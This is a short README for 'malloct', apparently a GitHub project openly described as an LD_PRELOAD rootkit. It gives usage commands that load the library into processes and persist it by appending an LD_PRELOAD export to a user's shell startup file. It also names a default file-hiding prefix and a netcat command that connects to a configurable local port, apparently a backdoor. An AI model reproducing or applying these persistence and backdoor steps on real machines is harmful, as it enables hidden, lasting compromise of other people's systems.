# malloct
LD_PRELOAD rootkit

# make
$ make

# usage
**make your own configuration in src/config.h**

$ LD_PRELOAD=./libmalloct.so ls -aphl /home/$USER/

$ LD_PRELOAD=./libmalloct.so ls -hl /tmp/*

$ export LD_PRELOAD=/tmp/libmalloct.so

$ echo "export LD_PRELOAD=/tmp/libmalloct.so" >> /home/$USER/.kshrc

> set to which shell you are using

> you can set to the program you will use 

# note
is a **core** LD_PRELOAD rootkit

default prefix is **lifeless-**

# nc
**you can set custom port in src/config.h**

nc -vn 127.0.0.1 1337

# example
![image](https://github.com/user-attachments/assets/67132173-bd65-4e18-a991-8664cd155849)
